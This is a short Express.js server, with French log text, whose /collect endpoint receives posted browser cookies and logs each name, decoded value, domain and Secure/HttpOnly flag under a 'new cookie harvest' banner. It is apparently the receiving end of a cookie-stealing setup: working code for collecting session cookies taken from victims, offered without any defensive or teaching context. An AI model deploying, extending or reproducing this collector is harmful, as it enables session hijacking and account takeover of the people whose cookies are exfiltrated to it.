const express = require("express");
const app = express();

app.use(express.json());

function safeDecode(value) {
  try {
    return decodeURIComponent(value);
  } catch (e) {
    return value; // au cas où ce n'est pas encodé
  }
}

app.post("/collect", (req, res) => {
  const cookies = req.body.cookies;

  const now = new Date();
  const date = now.toLocaleDateString("fr-FR");
  const time = now.toLocaleTimeString("fr-FR");

  console.log("\n=======================================");
  console.log("🍪 NOUVELLE RÉCUPÉRATION DE COOKIES");
  console.log(`📅 Date : ${date}`);
  console.log(`⏰ Heure : ${time}`);
  console.log("=======================================\n");

  if (!cookies || cookies.length === 0) {
    console.log("⚠️ Aucun cookie reçu");
  } else {
    cookies.forEach((cookie, index) => {
      const decodedValue = safeDecode(cookie.value);

      console.log(`Cookie ${index + 1}`);
      console.log(`Nom       : ${cookie.name}`);
      console.log(`Valeur    : ${decodedValue}`);
      console.log(`Domaine   : ${cookie.domain}`);
      console.log(`Secure    : ${cookie.secure}`);
      console.log(`HttpOnly  : ${cookie.httpOnly}`);
      console.log("---------------------------------------");
    });
  }

  res.json({ status: "ok" });
});

app.get("/", (req, res) => {
  res.send("Le serveur fonctionne !");
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
